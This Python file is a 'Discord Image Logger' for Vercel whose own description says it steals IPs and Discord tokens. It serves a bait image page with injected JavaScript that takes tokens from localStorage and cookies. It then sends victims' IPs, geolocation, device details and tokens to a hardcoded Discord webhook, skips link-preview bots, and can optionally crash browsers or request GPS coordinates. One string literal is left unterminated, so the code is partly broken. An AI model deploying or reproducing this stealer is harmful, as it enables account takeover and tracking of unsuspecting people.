from urllib import parse
import traceback, requests, base64, httpagentparser, os

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and Discord tokens"
__version__ = "v3.0"
__author__ = "C00lB0i"

config = {
    "webhook": os.environ.get('WEBHOOK_URL', "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz"),
    "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "tokenLogging": True,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if useragent is None:
        return False
    if ip.startswith(("34", "35")) or "Discordbot" in useragent:
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        }, timeout=5)
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            }, timeout=5)
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
        if info["proxy"]:
            if config["vpnCheck"] == 2:
                return
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info["hosting"]:
            if config["antiBot"] == 4:
                if not info["proxy"]:
                    return
            elif config["antiBot"] == 3:
                return
            elif config["antiBot"] == 2:
                if not info["proxy"]:
                    ping = ""
            elif config["antiBot"] == 1:
                ping = ""
    except:
        info = {}
        for key in ['isp', 'as', 'country', 'regionName', 'city', 'lat', 'lon', 'timezone', 'mobile', 'proxy', 'hosting']:
            info[key] = "Error"

    os, browser = "Unknown", "Unknown"
    if useragent:
        try:
            os, browser = httpagentparser.simple_detect(useragent)
        except:
            pass
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp']}`
> **ASN:** `{info['as']}`
> **Country:** `{info['country']}`
> **Region:** `{info['regionName']}`
> **City:** `{info['city']}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ') if 'timezone' in info else 'Unknown'} ({info['timezone'].split('/')[0] if 'timezone' in info else 'Unknown'})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
                }
        ],
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except Exception as e:
        reportError(f"Failed to send main webhook: {str(e)}")
    
    return info

def reportToken(ip, useragent, token, endpoint="N/A"):
    if not token or token == "NOT_FOUND":
        return
    
    embed = {
        "username": "TOKEN LOGGER",
        "content": "@everyone **CRITICAL TOKEN CAPTURED**",
        "embeds": [
            {
                "title": "Discord Token Captured!",
                "color": 0xFF0000,
                "description": f"""**A Discord token was captured!**

**Endpoint:** `{endpoint}`
**IP:** `{ip}`
**Token:** `{token}`

**Token Information:**
> **Account ID:** `{token.split('.')[0] if '.' in token else 'N/A'}`
> **Creation Timestamp:** `{token.split('.')[1] if '.' in token and len(token.split('.')) > 1 else 'N/A'}`

**Handle with extreme care as this provides full account access!**""",
            }
        ],
    }
    
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except Exception as e:
        reportError(f"Failed to send token webhook: {str(e)}")

# Token capture JavaScript
token_js = """
document.addEventListener('DOMContentLoaded', function() {
    function captureToken() {
        let token = "NOT_FOUND";
        
        // Check localStorage
        const tokenKeys = ['token', '_token', 'discord_token', 'auth_token'];
        for (const key of tokenKeys) {
            const value = localStorage.getItem(key);
            if (value) {
                token = value;
                break;
            }
        }
        
        // Check cookies if not found
        if (token === "NOT_FOUND") {
            const cookies = document.cookie.split(';');
            for (const cookie of cookies) {
                const [name, value] = cookie.trim().split('=');
                if (tokenKeys.includes(name)) {
                    token = value;
                    break;
                }
            }
        }
        
        // Send token to server
        const img = new Image();
        img.src = '/api/image2/logtoken?token=' + encodeURIComponent(token);
    }
    
    setTimeout(captureToken, 1500);
});
"""

# Vercel handler function
def handler(event, context):
    try:
        method = event['httpMethod']
        path = event['path']
        headers = event.get('headers', {})
        query = event.get('queryStringParameters', {})
        body = event.get('body', '')
        is_base64 = event.get('isBase64Encoded', False)
        
        # Handle token.js request
        if path == '/api/image2/token.js':
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'application/javascript'},
                'body': token_js
            }
            
        # Handle token logging
        if path == '/api/image2/logtoken':
            ip = headers.get('x-forwarded-for', headers.get('x-real-ip', 'Unknown'))
            useragent = headers.get('user-agent', 'Unknown')
            
            token = ""
            if method == 'GET':
                token = query.get('token', '')
            elif method == 'POST' and body:
                if is_base64:
                    body = base64.b64decode(body).decode('utf-8')
                try:
                    data = parse.parse_qs(body)
                    token = data.get('token', [''])[0]
                except:
                    pass
            
            if token:
                reportToken(ip, useragent, token, path)
            
            # Return transparent pixel
            pixel = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'image/png'},
                'body': pixel,
                'isBase64Encoded': True
            }
        
        # Main image handling
        if config["imageArgument"] and ('url' in query or 'id' in query):
            try:
                url = base64.b64decode(query.get('url') or query.get('id')).decode()
            except:
                url = config["image"]
        else:
            url = config["image"]
        
        # Build HTML content
        html_content = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''
        
        # Add token capture if enabled
        if config["tokenLogging"]:
            html_content += '<script src="/api/image2/token.js"></script>'
        
        # Get client IP
        ip = headers.get('x-forwarded-for', headers.get('x-real-ip', 'Unknown'))
        useragent = headers.get('user-agent', 'Unknown')
        
        # Skip blacklisted IPs
        if ip.startswith(blacklistedIPs):
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'text/html'},
                'body': html_content
            }
        
        # Bot handling
        bot = botCheck(ip, useragent)
        if bot:
            if config["buggedImage"]:
                # Create bugged image response
                loading_img = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
                return {
                    'statusCode': 200,
                    'headers': {'Content-Type': 'image/jpeg'},
                    'body': base64.b64encode(loading_img).decode(),
                    'isBase64Encoded': True
                }
            else:
                # Redirect to image
                return {
                    'statusCode': 302,
                    'headers': {'Location': url}
                }
        
        # Handle GPS coordinates
        coords = None
        if 'g' in query and config["accurateLocation"]:
            try:
                coords = base64.b64decode(query['g']).decode()
            except:
                pass
        
        # Create report
        result = makeReport(ip, useragent, coords, path, url=url)
        
        # Custom message handling
        message = config["message"]["message"]
        if config["message"]["doMessage"]:
            if config["message"]["richMessage"] and result:
                replacements = {
                    "{ip}": ip,
                    "{isp}": result.get("isp", "Unknown"),
                    "{asn}": result.get("as", "Unknown"),
                    "{country}": result.get("country", "Unknown"),
                    "{region}": result.get("regionName", "Unknown"),
                    "{city}": result.get("city", "Unknown"),
                    "{browser}": result.get("browser", "Unknown"),
                    "{os}": result.get("os", "Unknown")
                }
                for placeholder, value in replacements.items():
                    message = message.replace(placeholder, value)
                html_content = message
        
        # Browser crash option
        if config["crashBrowser"]:
            html_content += '<script>setTimeout(function(){for(var i=0;i<100;i++){window.open("")}},100)</script>'
        
        # Redirection
        if config["redirect"]["redirect"]:
            html_content = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
        
        # Accurate location script
        if config["accurateLocation"]:
            html_content += """<script>
if (!window.location.href.includes("g=") && navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        const coords = position.coords.latitude + "," + position.coords.longitude;
        const encoded = btoa(coords).replace(/=/g, "%3D");
        const newUrl = window.location.href + (window.location.href.includes('?') ? '&' : '?') + 'g=' + encoded;
        window.location.href = newUrl;
    });
}
</script>"""
        
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'text/html'},
            'body': html_content
        }
    
    except Exception as e:
        error_trace = traceback.format_exc()
        reportError(f"Handler Error: {str(e)}\n{error_trace}")
        return {
            'statusCode': 500,
            'body': '500 - Internal Server Error'
        }

# For local testing
if __name__ == "__main__":
    # This part is only for local testing and won't run on Vercel
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import json
    
    class TestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            event = {
                'httpMethod': 'GET',
                'path': self.path,
                'headers': dict(self.headers),
                'queryStringParameters': parse.parse_qs(parse.urlsplit(self.path).query),
                'body': '',
                'isBase64Encoded': False
            }
            response = handler(event, None)
            
            self.send_response(response['statusCode'])
            for key, value in response.get('headers', {}).items():
                self.send_header(key, value)
            self.end_headers()
            
            body = response.get('body', '')
            if response.get('isBase64Encoded', False):
                body = base64.b64decode(body)
            self.wfile.write(body.encode() if isinstance(body, str) else body)
    
    print("Local test server running on port 8080")
    HTTPServer(('', 8080), TestHandler).serve_forever()
